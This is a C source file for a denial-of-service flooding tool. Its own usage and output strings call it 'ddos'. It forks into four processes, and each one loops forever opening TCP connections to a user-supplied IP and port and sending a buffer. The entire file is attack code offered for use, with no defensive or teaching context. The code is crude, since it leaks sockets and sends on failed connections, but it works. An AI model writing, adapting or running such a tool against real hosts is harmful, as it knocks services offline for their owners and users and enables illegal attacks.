#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define MY_DEFAULT_SIZE 4096
#define CONNECT_REQUEST_MSG_LEN 20 // 1 byte for the first char 16 bytes for the port number

int create_client_socket(char* ip, int port);

int parse_ip(char* ip){
    char* needle;
    if((needle = strchr(ip, ':')) != NULL){
        *needle = '\0';
        ++needle;
    }
    else{
        return 0;
    }
    return atoi(needle);
}

int main(int args, char** argv){
    int bytes = MY_DEFAULT_SIZE;
    char* buffer;
    int port, sockfd;

    if(args < 2){
        printf("Usage: ddos ip:port (optional) bytes to send\n");
        return 1;
    }

    port = parse_ip(argv[1]);
    if(port == 0){
        printf("Not correct ip address");
        return 1;
    }

    if(args > 2){
        bytes = atoi(argv[2]);
        if(bytes <= 0)
            bytes = MY_DEFAULT_SIZE;
    }

    sockfd = create_client_socket(argv[1], port);

    if(sockfd < 0){
        perror("Connection failed");
        return 1;
    }

    buffer= (char*)malloc(bytes);

    if(buffer == NULL){
        perror("No Memory");
        return 1;
    }

    bzero(buffer, bytes);

    printf("Launching ddos attack on %s:%d by using %d buffers\n", argv[1], port, bytes);

    if(fork() == 0){
        if(fork() == 0){
            for(;;){
                sockfd = create_client_socket(argv[1], port);
                send(sockfd, buffer, bytes, 0);
            }
        }
        else{
            for(;;){
                sockfd = create_client_socket(argv[1], port);
                send(sockfd, buffer, bytes, 0);
            }
        }
    }
    else{
        if(fork() == 0){
            for(;;){
                sockfd = create_client_socket(argv[1], port);
                send(sockfd, buffer, bytes, 0);
            }
        }
        else{
            for(;;){
                sockfd = create_client_socket(argv[1], port);
                send(sockfd, buffer, bytes, 0);
            }
        }
    }
    return 0;
}

int create_client_socket(char* ip, int port){
    int addr_fd;
    struct sockaddr_in sock_addr;

    if((addr_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
        return -1;

    bzero(&sock_addr, sizeof(struct sockaddr_in));

    sock_addr.sin_family = AF_INET;
    sock_addr.sin_port = htons(port);
    inet_aton(ip, &sock_addr.sin_addr);

    if(connect(addr_fd, (struct sockaddr *)&sock_addr, sizeof(sock_addr)) < 0)
        return -2;

    return addr_fd;
}

